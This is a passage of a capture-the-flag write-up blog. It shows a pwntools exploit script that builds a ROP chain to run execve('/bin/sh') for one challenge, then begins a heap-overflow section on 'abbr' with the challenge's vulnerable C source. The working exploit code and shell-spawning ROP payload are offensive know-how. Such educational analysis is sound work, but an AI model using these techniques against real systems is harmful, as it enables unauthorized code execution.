<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py
</span><span class="s1">set follow-fork-mode parent
</span><span class="s1">b* main
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1">#===========================================================</span>
<span class="c1">#                    EXPLOIT GOES HERE</span>
<span class="c1">#===========================================================</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;-2&#34;</span><span class="p">)</span>

<span class="c1"># 0x0000000000406c32 : mov qword ptr [rax], rsi ; ret</span>
<span class="c1"># 0x0000000000401001 : pop rax ; ret</span>
<span class="c1"># 0x00000000004019a3 : pop rsi ; ret</span>
<span class="c1"># 0x00000000004013e9 : syscall</span>
<span class="c1"># 0x0000000000403d23 : pop rdx ; ret</span>
<span class="c1"># 0x0000000000401b0d : pop rdi ; ret</span>

<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
<span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
<span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x00000000004019a3</span>

<span class="n">MOV_RSI_PTR_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000406c32</span>

<span class="n">PT_LOAD_W</span> <span class="o">=</span> <span class="mh">0x00000000040c240</span>

<span class="n">pld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">MOV_RSI_PTR_RAX</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">PT_LOAD_W</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">pld</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="abbr">
        abbr
        <a data-clipboard-text="https://nasm.re/posts/pwnasis/#abbr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor abbr" href="#abbr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
<p>Here is the source code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&#34;rules.h&#34;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">Translator</span> <span class="p">{</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">translate</span><span class="p">)(</span><span class="kt">char</span><span class="o">*</span><span class="p">);</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span> <span class="n">Translator</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">english_expand</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">alen</span><span class="p">,</span> <span class="n">blen</span><span class="p">;</span>
  <span class="n">Rule</span> <span class="o">*</span><span class="n">r</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">text</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// pointer to the last character
</span><span class="c1"></span>
  <span class="cm">/* Replace all abbreviations */</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="o">++</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rules</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Rule</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">r</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rules</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
      <span class="n">alen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">);</span>
      <span class="n">blen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">strncasecmp</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">,</span> <span class="n">alen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// i.e &#34;i&#39;m pwn noob.&#34; --&gt; &#34;i&#39;m pwn XXnoob.&#34;
</span><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="n">q</span> <span class="o">=</span> <span class="n">end</span><span class="p">;</span> <span class="n">q</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">;</span> <span class="o">--</span><span class="n">q</span><span class="p">)</span>
          <span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">+</span><span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
        <span class="c1">// Update end
</span><span class="c1"></span>        <span class="n">end</span> <span class="o">+=</span> <span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="n">end</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
        <span class="c1">// i.e &#34;i&#39;m pwn XXnoob.&#34; --&gt; &#34;i&#39;m pwn newbie.&#34;
</span><span class="c1"></span>        <span class="n">memcpy</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">,</span> <span class="n">blen</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="n">Translator</span> <span class="o">*</span><span class="nf">translator_new</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">;</span>

  <span class="cm">/* Allocate region for text */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">text</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="cm">/* Initialize translator */</span>
  <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">Translator</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Translator</span><span class="p">));</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span> <span class="o">=</span> <span class="n">english_expand</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">t</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">translator_reset</span><span class="p">(</span><span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>

  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span> <span class="o">=</span> <span class="n">translator_new</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Input data */</span>
    <span class="n">translator_reset</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter text: &#34;</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>

    <span class="cm">/* Expand abbreviation */</span>
    <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Result: %s&#34;</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The <code>rules.h</code> looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">// abbreviated string (i.e &#34;asap&#34;)
</span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span> <span class="c1">// expanded string (i.e &#34;as soon as possible&#34;)
</span><span class="c1"></span><span class="p">}</span> <span class="n">Rule</span><span class="p">;</span>

<span class="c1">// Why are there so many abbreviations in English!!?? :exploding_head:
</span><span class="c1"></span><span class="n">Rule</span> <span class="n">rules</span><span class="p">[]</span> <span class="o">=</span>
  <span class="p">{</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;2f4u&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;too fast for you&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;4yeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyeo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your eyes only&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aamof&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as a matter of fact&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afaik&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;as far as i know&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;afk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;away from keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;aka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;also known as&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b2k&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to keyboard&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;back to topic&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;btw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;by the way&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;b/c&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;because&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;c&amp;p&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;copy and paste&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;cys&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;check your settings&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;diy&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;do it yourself&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;eobd&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;end of business day&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;faq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;frequently asked questions&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fka&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;formerly known as&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fwiw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for what it&#39;s worth&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;fyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;for your information&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;jfyi&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;just for your information&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;have fun&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;hth&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;hope this helps&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;idk&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;i don&#39;t know&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iirc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;if i remember correctly&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my humble opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imo&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;imnsho&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in my not so humble opinion&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;iow&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in other words&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;itt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;in this thread&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;dgmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;don&#39;t get me wrong&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;mmw&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;mark my words&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nntr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no need to reply&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noob&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;newbie&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;noyb&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;none of your business&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;nrn&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;no reply necessary&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;otoh&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;on the other hand&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;rtfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;read the fine manual&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;scnr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry, could not resist&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;sflr&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;sorry for late reply&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tba&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be announced&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tbc&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;to be continued&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tia&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thanks in advance&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tq&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyvm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;thank you very much&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;tyt&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;take your time&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;ttyl&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;talk to you later&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wfm&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;works for me&#34;</span><span class="p">},</span>
   <span class="p">{.</span><span class="n">a</span><span class="o">=</span><span class="s">&#34;wtf&#34;</span><span class="p">,</span> <span class="p">.</span><span class="n">b</span><span class="o">=</span><span class="s">&#34;what the fuck&#34;</span><span class="p">},</span>
